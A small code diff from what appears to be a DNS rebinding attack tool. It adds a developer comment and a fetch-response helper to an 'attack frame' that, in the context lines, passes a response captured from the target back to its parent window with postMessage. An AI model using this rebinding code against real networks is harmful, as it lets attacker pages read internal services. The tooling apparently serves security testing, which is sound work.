@@ -78,7 +78,7 @@ const Rebinder = () => {
                     body = responseData;
                     clearInterval(timer); // stop the attack timer
                     // Report success to parent frame
-                    window.parent.postMessage({
+                    window.parent.postMessage({ //TKTK fix Docker hack
                         status: "success",
                         response: body
                     }, "*");
@@ -199,6 +199,17 @@ function buildCookie(val, days) {
 function getCookies() {
     return document.cookie === "" ? [] : document.cookie.split(';').map(x => x.trim());
 
+}
+
+function responseOKOrFail(errorString) {
+    return function (r) {
+        if (r.ok) {
+            console.log("attack frame ", window.location.hostname, " received a response");
+            return r.text()
+        } else {
+            throw new Error(errorString)
+        }
+    }
 }
 
 // Converts an ArrayBuffer directly to base64, without any intermediate 'convert to string then
